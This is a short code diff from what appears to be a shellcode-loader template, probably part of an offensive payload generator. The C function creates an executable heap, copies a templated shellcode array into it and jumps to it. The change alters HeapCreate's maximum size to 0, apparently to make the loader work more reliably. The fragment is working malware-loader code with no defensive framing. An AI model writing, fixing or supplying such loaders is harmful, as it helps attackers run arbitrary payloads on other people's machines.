@@ -5,7 +5,7 @@ int heapFuncs(LPVOID nothing)
     HANDLE hCr9;
     unsigned char s[] = {{ {.Shellcode} }};
     int size = sizeof(s);
-    hCr9 = HeapCreate(0x00040000, size, size);
+    hCr9 = HeapCreate(0x00040000, size, 0);
     LPVOID pcsHeapAlloc = HeapAlloc(hCr9, 0x00000008, size);
     memcpy_s(pcsHeapAlloc, size, s, size);
     ((void(*)())pcsHeapAlloc)();
